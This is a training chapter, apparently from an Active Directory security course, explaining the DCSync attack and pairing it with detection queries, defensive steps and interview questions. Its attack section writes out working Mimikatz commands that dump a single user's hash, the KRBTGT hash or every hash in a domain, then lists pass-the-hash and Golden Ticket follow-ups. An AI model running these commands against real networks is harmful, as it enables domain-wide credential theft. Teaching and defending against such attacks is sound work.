# 09 — DCSync Attack

> **Section:** 05 — AD Attack Techniques  
> **Difficulty:** Advanced  
> **Protocol exploited:** AD Replication (MS-DRSR)  
> **Privilege required:** "Replicating Directory Changes" permission

---

## 📌 What is DCSync?

Active Directory uses replication to keep all Domain Controllers in sync. When a DC replicates from another DC, it uses the **MS-DRSR (Directory Replication Service Remote Protocol)** to request object data including password hashes.

**DCSync** (a Mimikatz module) impersonates a Domain Controller and uses this replication protocol to **pull all password hashes from AD** — without touching the DC's disk, without needing physical access, and generating minimal logs.

> **Simple definition:**  
> DCSync pretends to be a Domain Controller and requests password hash replication from a real DC — getting every account's NTLM hash and Kerberos keys in seconds, completely remotely.

---

## ⚙️ Step-by-Step Attack

```
Prerequisite: Account with "Replicating Directory Changes" permission
              (Normally: Domain Admins, Enterprise Admins, Domain Controllers)
              (Can be granted via ACL abuse — WriteDACL on domain root)

Step 1: Verify replication rights
  Get-ADUser -Identity "hareesh" -Properties memberof
  OR: Check if account is in Domain Admins / Enterprise Admins

Step 2: Run DCSync to get specific account hash
  mimikatz # lsadump::dcsync /domain:company.local /user:GP
  
  Output:
  Object  RDN           : GP
  Hash NTLM: 8f3c2d9e1a7b4f6c...  ← GP's NTLM hash
  Hash NTLM (previous): ...        ← Previous password hash too!
  
  # Get KRBTGT hash (enables Golden Ticket)
  mimikatz # lsadump::dcsync /domain:company.local /user:krbtgt

Step 3: Dump ALL hashes (entire domain)
  mimikatz # lsadump::dcsync /domain:company.local /all /csv
  → Outputs every account's NTLM hash and Kerberos keys
  → Thousands of hashes in seconds
  → No one gets locked out (replication is silent)
  → No need to be on DC itself

Step 4: Use the hashes
  Pass-the-Hash with any account ← instant lateral movement
  Crack hashes offline ← recover cleartext passwords
  Create Golden Ticket with KRBTGT hash ← persistence
  Authenticate to any service ← full domain control
```

### Why DCSync is Devastating

```
Traditional credential dumping (old way):
  Attacker must physically log into DC
  Open Mimikatz on DC console
  Very noisy — unusual process on DC

DCSync (modern way):
  Works from ANY machine in the network
  Attacker never touches the DC physically
  Looks like normal DC-to-DC replication traffic
  Gets EVERY hash in the domain in one command
  Includes: all users, service accounts, KRBTGT, machine accounts
```

---

## 🔍 Detection

```
Event ID 4662 — Operation performed on AD object
  Flags to watch:
  → Access Mask: 0x100 (Control Access)
  → Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} ← Replicating Directory Changes
                {1131f6ab-9c07-11d1-f79f-00c04fc2dcd2} ← Replicating Directory Changes All
  → Subject: NOT a Domain Controller computer account ← anomaly!

Normal replication: DC$ account (computer account ending in $) requests replication
DCSync attack: User account (no $) requests replication ← ALERT

KQL for Sentinel:
  SecurityEvent
  | where EventID == 4662
  | where ObjectType == "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"
  | where Properties has "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
  | where SubjectUserName !endswith "$"  ← user account, not DC computer account
  | project TimeGenerated, SubjectUserName, SubjectDomainName, IpAddress

Defender for Identity:
  → "Suspected DCSync attack (replication of directory services)" ← automatic
  → One of the highest-fidelity alerts in MDI
```

---

## 🛡️ Defence

```
1. Restrict "Replicating Directory Changes" permission:
   Only Domain Controllers should have this right
   
   Audit who has it:
   $DomainDN = (Get-ADDomain).DistinguishedName
   (Get-ACL "AD:\$DomainDN").Access |
       Where-Object {
           $_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or
           $_.ObjectType -eq "1131f6ab-9c07-11d1-f79f-00c04fc2dcd2"
       } |
       Select-Object IdentityReference, ActiveDirectoryRights
   
   Remove any non-DC accounts from having these rights

2. Protect Domain Admins accounts:
   DCSync requires Domain Admin (or explicit replication rights)
   → Tiered Admin Model (Section 04-01)
   → Protected Users for all admin accounts
   → PAWs for all admin work

3. Deploy Microsoft Defender for Identity:
   → Automatic DCSync detection
   → Alert fires within seconds of DCSync execution

4. Monitor Event ID 4662:
   Set up SIEM rule to alert on ANY 4662 with replication rights
   from a non-DC source
   This is a near-zero false positive alert

5. Network segmentation:
   DCs should only receive replication traffic from other DCs
   Block port 135/TCP and 49152-65535/TCP from workstations to DCs
   (These are the RPC ports used by MS-DRSR / DCSync)
```

---

## 🎯 Interview Questions

**Q1. What is a DCSync attack and what makes it different from traditional credential dumping?**  
**A:** DCSync uses Mimikatz to impersonate a Domain Controller and request password hash replication via the MS-DRSR protocol. Unlike traditional credential dumping (which requires logging into the DC directly and running tools on it), DCSync works remotely from any machine — the attacker never touches the DC. It pulls every account's hash including KRBTGT in seconds, generating only standard replication-looking network traffic. The only reliable detection is monitoring Event ID 4662 for replication rights access from non-DC accounts.

**Q2. What permission does DCSync require and how can attackers get it without being Domain Admin?**  
**A:** DCSync requires "Replicating Directory Changes" (and "Replicating Directory Changes All") permission on the domain root object. Normally only Domain Controllers, Domain Admins, and Enterprise Admins have this. However, if an attacker has WriteDACL on the domain root object (an ACL misconfiguration), they can grant themselves this permission without being Domain Admin — an ACL abuse attack path that BloodHound would identify.

**Q3. How do you detect DCSync when the replication traffic looks legitimate?**  
**A:** The key indicator is WHO is requesting replication. Legitimate replication happens between DC computer accounts (ending in $). DCSync runs from a user account or workstation. Monitor Event ID 4662 and alert when the replication rights are accessed by a non-DC account (SubjectUserName not ending in $). Defender for Identity does this automatically and alerts within seconds.

---

*"DCSync is the quietest way to steal every credential in Active Directory. It looks like normal replication, it runs remotely, it needs no tools on the DC — and it dumps your entire domain's secrets in under a minute. Guard the replication rights as carefully as you guard Domain Admin."*
